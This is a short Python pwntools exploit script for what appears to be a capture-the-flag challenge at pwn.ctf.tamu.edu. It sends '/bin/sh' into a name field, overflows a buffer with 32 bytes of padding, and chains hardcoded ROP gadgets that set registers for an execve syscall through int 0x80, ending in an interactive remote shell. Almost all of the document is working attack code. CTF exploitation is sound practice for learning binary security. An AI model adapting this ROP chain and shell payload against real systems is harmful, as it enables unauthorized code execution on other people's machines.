# Static binary without libc and nc flag set. Rop2win by setting registers ecx and edi to zero, ebx to /bin/sh address and eax to 0xb. The /bin/sh string is written into the name variable, therfore giving us a constant address to use. 

from pwn import *

context.log_level = 'debug'

int80 = 0x08073990 #int 0x80; ret
xorEaxPop = 0x080bca9b #xor eax, eax; pop ebx; ret
addEaxPop = 0x080925c2 #add eax, 0xb; pop edi; ret
popEcx = 0x080e4325 #pop ecx; ret
nameAddress = 0x80f1a20

r = remote('pwn.ctf.tamu.edu',4325)
#r = remote('192.168.122.76',4325)

r.sendline('/bin/sh\x00')
r.sendline('bug')
r.sendline('info')
r.sendline('y')
#r.recvuntil('(Input option number)')

r.sendline('2')
exp = ("A"*32)
exp += p32(xorEaxPop)
exp += p32(nameAddress)
exp += p32(addEaxPop)
exp += p32(0x0)
exp += p32(popEcx)
exp += p32(0x0)
exp += p32(int80)

r.sendline(exp)
r.interactive()
